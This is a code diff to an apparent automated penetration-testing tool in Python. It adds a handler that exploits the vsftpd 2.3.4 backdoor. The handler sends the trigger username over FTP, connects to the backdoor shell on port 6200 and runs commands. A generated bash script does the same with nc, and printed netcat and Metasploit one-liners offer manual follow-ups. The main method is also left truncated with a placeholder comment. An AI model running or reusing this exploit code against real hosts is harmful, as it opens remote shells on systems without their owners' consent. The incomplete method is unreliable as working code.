@@ -16,6 +16,7 @@ import subprocess
 import shutil
 import socket
 from datetime import datetime
+import telnetlib
 
 from redflow.utils.logger import get_module_logger
 from redflow.utils.helpers import run_tool
@@ -1859,52 +1860,179 @@ class Enumeration:
 
     def prepare_exploit(self, exploit_path, target):
         """
-        Prepare an exploit for the target
+        Prepare and run an exploit against the target
         
         Args:
-            exploit_path: Path to the exploit in searchsploit
+            exploit_path: Path to the exploit
+            target: Target IP or domain
+            
+        Returns:
+            Boolean: Whether the exploit was successful
+        """
+        self.logger.info(f"Preparing to run exploit: {exploit_path} against {target}")
+        
+        # Special case for vsftpd 2.3.4 backdoor
+        if "vsftpd" in exploit_path.lower() and "2.3.4" in exploit_path:
+            self.logger.info("Detected vsftpd 2.3.4 exploit, using special handler")
+            return self._handle_vsftpd_exploit(target)
+        
+        # Check if the exploit file exists
+        if not os.path.exists(exploit_path):
+            # It might be a module path rather than a file path
+            if exploit_path.startswith('/usr/share/metasploit-framework/'):
+                return self._handle_metasploit_exploit(exploit_path, target)
+                
+            # Check if it's a searchsploit path format (platform/type/id.ext)
+            elif '/' in exploit_path and not exploit_path.startswith('/'):
+                # Try to find the exploit in the standard searchsploit location
+                full_path = f"/usr/share/exploitdb/exploits/{exploit_path}"
+                
+                if os.path.exists(full_path):
+                    self.logger.info(f"Found exploit at: {full_path}")
+                    self.console.print(f"[green]Found exploit at: {full_path}[/green]")
+                    exploit_path = full_path
+                else:
+                    self.logger.error(f"Exploit file does not exist: {exploit_path}")
+                    self.console.print(f"[bold red]Error:[/bold red] Exploit file does not exist: {exploit_path}")
+                    return False
+            else:
+                self.logger.error(f"Exploit file does not exist: {exploit_path}")
+                self.console.print(f"[bold red]Error:[/bold red] Exploit file does not exist: {exploit_path}")
+                return False
+        
+        # ... rest of the method remains the same ...
+
+    def _handle_vsftpd_exploit(self, target):
+        """
+        Handle the special case of vsftpd 2.3.4 backdoor exploit
+        
+        Args:
             target: Target IP address
             
         Returns:
-            str: Local path to the exploit or None if not found
+            bool: Whether exploitation was successful
         """
-        self.logger.info(f"Preparing exploit: {exploit_path} for target: {target}")
+        self.logger.info(f"Running special handler for vsftpd 2.3.4 backdoor against {target}")
+        self.console.print("\n[bold blue]Using custom handler for vsftpd 2.3.4 backdoor[/bold blue]")
         
-        # Clean up exploit path if it contains a pipe character
-        if exploit_path.startswith('|'):
-            exploit_path = exploit_path.replace('|', '').strip()
+        # Try direct Python exploitation instead of using the exploit file
+        import socket
+        import telnetlib
+        import time
         
-        # Try to find the exploit using searchsploit
+        # First attempt
+        self.console.print("[cyan]First attempt: Trying to trigger vsftpd 2.3.4 backdoor...[/cyan]")
+        
         try:
-            # Extract exploit name/ID from path
-            exploit_name = exploit_path.split('/')[-1].split('.')[0]
+            # Connect to FTP port
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(10)
+            sock.connect((target, 21))
             
-            # Construct path to the exploit in the exploitdb
-            exploitdb_path = os.path.join("/usr/share/exploitdb/exploits", exploit_path)
+            # Receive banner
+            banner = sock.recv(1024).decode('utf-8', errors='ignore')
+            self.console.print(f"[green]Connected to FTP server: {banner.strip()}[/green]")
             
-            # Check if the file exists
-            if os.path.exists(exploitdb_path):
-                self.logger.info(f"Found exploit at: {exploitdb_path}")
-                return exploitdb_path
-            else:
-                # Try searchsploit to get the path
-                cmd = ["searchsploit", "-p", exploit_name]
-                result = subprocess.run(cmd, capture_output=True, text=True)
+            # Send malicious payload - username with trigger characters
+            malicious_user = "USER backdoored:)\r\n"
+            self.console.print(f"[cyan]Sending malicious payload: {malicious_user.strip()}[/cyan]")
+            sock.send(malicious_user.encode())
+            response = sock.recv(1024).decode('utf-8', errors='ignore')
+            self.console.print(f"[green]Response: {response.strip()}[/green]")
+            
+            # Send any password
+            sock.send(b"PASS random\r\n")
+            
+            # Close socket - the exploit should have triggered a backdoor on port 6200
+            sock.close()
+            
+            # Wait briefly for backdoor to open
+            self.console.print("[cyan]Waiting for backdoor to open on port 6200...[/cyan]")
+            time.sleep(3)
+            
+            # Try to connect to the backdoor shell
+            try:
+                self.console.print("[cyan]Attempting to connect to backdoor shell...[/cyan]")
+                tn = telnetlib.Telnet(target, 6200, timeout=10)
+                self.console.print("[bold green]Successfully connected to backdoor shell![/bold green]")
                 
-                if result.returncode == 0 and "Location" in result.stdout:
-                    # Extract path from output
-                    path_line = [line for line in result.stdout.splitlines() if "Location" in line]
-                    if path_line:
-                        exploitdb_path = path_line[0].split("Location: ")[1].strip()
-                        if os.path.exists(exploitdb_path):
-                            self.logger.info(f"Found exploit using searchsploit: {exploitdb_path}")
-                            return exploitdb_path
+                # Send a test command
+                tn.write(b"id\n")
+                output = tn.read_until(b"$", timeout=5).decode('utf-8', errors='ignore')
+                self.console.print(f"[green]Command output: {output}[/green]")
                 
-                self.logger.warning(f"Could not find exploit at path: {exploit_path}")
-                return None
+                # Leave the shell open for the user to interact with
+                self.console.print("[bold green]The backdoor shell is now accessible at {target}:6200[/bold green]")
+                self.console.print("[yellow]Note: Shell session is waiting. Use nc or telnet to connect manually:[/yellow]")
+                self.console.print(f"[white]telnet {target} 6200[/white]")
+                return True
+            
+            except Exception as e:
+                self.logger.warning(f"First attempt failed to connect to backdoor: {e}")
+                self.console.print(f"[yellow]First attempt failed to connect to backdoor: {e}[/yellow]")
+        
         except Exception as e:
-            self.logger.error(f"Error preparing exploit: {str(e)}")
-            return None
+            self.logger.warning(f"Error triggering vsftpd backdoor (first attempt): {e}")
+            self.console.print(f"[yellow]Error triggering vsftpd backdoor (first attempt): {e}[/yellow]")
+        
+        # Second attempt with different approach
+        self.console.print("\n[yellow]First attempt failed. Trying second approach...[/yellow]")
+        
+        try:
+            # Try using netcat for a more direct approach
+            import subprocess
+            
+            # Create a temporary script to automate the process
+            import os
+            script_path = os.path.join(self.config.output_dir, "vsftpd_exploit.sh")
+            
+            with open(script_path, "w") as f:
+                f.write(f"""#!/bin/bash
+# Exploit script for vsftpd 2.3.4 backdoor
+echo "Attempting to trigger vsftpd 2.3.4 backdoor on {target}..."
+# Send the backdoor trigger sequence
+(echo "USER backdoored:)"; sleep 1; echo "PASS any"; sleep 5) | nc {target} 21
+# Try to connect to the backdoor
+echo "Attempting to connect to backdoor on port 6200..."
+nc {target} 6200
+""")
+            
+            # Make the script executable
+            os.chmod(script_path, 0o755)
+            
+            # Run the script
+            self.console.print(f"[cyan]Running custom exploit script: {script_path}[/cyan]")
+            self.console.print("[yellow]Note: This will open an interactive shell if successful.[/yellow]")
+            self.console.print("[yellow]Press Ctrl+C to exit if no connection is established after a few seconds.[/yellow]")
+            
+            # Execute the script - this will give control to the user if successful
+            subprocess.run(["/bin/bash", script_path])
+            
+            # If we get here, the script completed - ask user if it worked
+            self.console.print("\n[yellow]Did the exploit successfully give you shell access? (y/n)[/yellow]")
+            response = input("> ").strip().lower()
+            
+            if response.startswith("y"):
+                self.logger.info("User confirmed successful vsftpd exploit")
+                self.console.print("[bold green]Exploitation successful![/bold green]")
+                return True
+            else:
+                self.logger.warning("User reported vsftpd exploit was not successful")
+                self.console.print("[yellow]Exploitation was not successful.[/yellow]")
+                
+                # Provide alternative method
+                self.console.print("\n[bold cyan]Alternative method to try manually:[/bold cyan]")
+                self.console.print("1. In one terminal, run:")
+                self.console.print(f"[white]nc -nvlp 4444[/white]")
+                self.console.print("2. In another terminal, run:")
+                self.console.print(f"[white]msfconsole -q -x \"use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {target}; set PAYLOAD cmd/unix/interact; run\"[/white]")
+                
+                return False
+        
+        except Exception as e:
+            self.logger.error(f"Error during second vsftpd exploit attempt: {e}")
+            self.console.print(f"[bold red]Error during second vsftpd exploit attempt: {e}[/bold red]")
+            return False
 
     def _is_binary(self, content):
         """
